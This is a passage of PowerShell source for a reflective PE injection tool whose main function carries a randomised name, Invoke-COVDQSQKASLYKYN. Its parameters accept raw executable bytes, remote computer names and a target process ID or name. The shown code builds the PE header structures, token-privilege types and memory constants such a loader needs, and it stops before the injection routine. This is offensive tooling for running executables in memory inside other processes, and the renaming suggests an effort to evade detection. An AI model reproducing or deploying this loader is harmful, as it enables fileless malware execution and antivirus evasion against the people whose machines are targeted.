function Invoke-COVDQSQKASLYKYN
{

[CmdletBinding()]
Param(
    [Parameter(Position = 0, Mandatory = $true)]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    $PEBytes,

	[Parameter(Position = 1)]
	[String[]]
	$ComputerName,

	[Parameter(Position = 2)]
    [ValidateSet( 'WString', 'String', 'Void' )]
	[String]
	$FuncReturnType = 'Void',

	[Parameter(Position = 3)]
	[String]
	$ExeArgs,

	[Parameter(Position = 4)]
	[Int32]
	$ProcId,

	[Parameter(Position = 5)]
	[String]
	$ProcName,

    [Switch]
    $ForceASLR,

	[Switch]
	$DoNotZeroMZ
)

Set-StrictMode -Version 2


$RemoteScriptBlock = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,

		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FuncReturnType,

		[Parameter(Position = 2, Mandatory = $true)]
		[Int32]
		$ProcId,

		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ProcName,

        [Parameter(Position = 4, Mandatory = $true)]
        [Bool]
        $ForceASLR
	)

	Function Get-Win32Types
	{
		$Win32Types = New-Object System.Object

		$Domain = [AppDomain]::CurrentDomain
		$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
		$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
		$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]

		$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		$TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		$MachineType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType


		$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		$MagicType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType


		$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		$SubSystemType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType


		$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		$TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		$TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		$TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		$DllCharacteristicsType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType



		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
		($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		$IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		$IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
		$IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		$IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
		$IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
		$IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
		$TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

		$e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
		$e_resField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

		$e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
		$e_res2Field.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		$IMAGE_DOS_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

		$nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
		$nameField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		$IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		$IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		$IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		$LUID = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
		$TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
		$TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		$LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES


		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
		$TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
		$TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

		return $Win32Types
	}

	Function Get-Win32Constants
	{
		$Win32Constants = New-Object System.Object

		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
